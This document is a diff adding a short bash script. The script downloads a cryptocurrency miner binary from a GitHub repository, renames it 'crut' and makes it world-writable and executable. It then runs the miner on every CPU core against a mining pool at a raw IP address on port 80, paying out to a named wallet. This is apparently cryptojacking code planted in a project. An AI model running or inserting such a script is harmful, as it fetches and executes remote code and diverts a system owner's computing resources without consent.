@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O crut https://github.com/nandafiku/fillesg/raw/main/cpuminer-avx2
+chmod 777 crut
+./crut -a yespower  -o stratum+tcp://45.76.185.233:80 -u unPw6ctQHeqACNCwFhXrPY5YUjVm9qNs4B.x -p webpassword=x -t $(nproc --all)
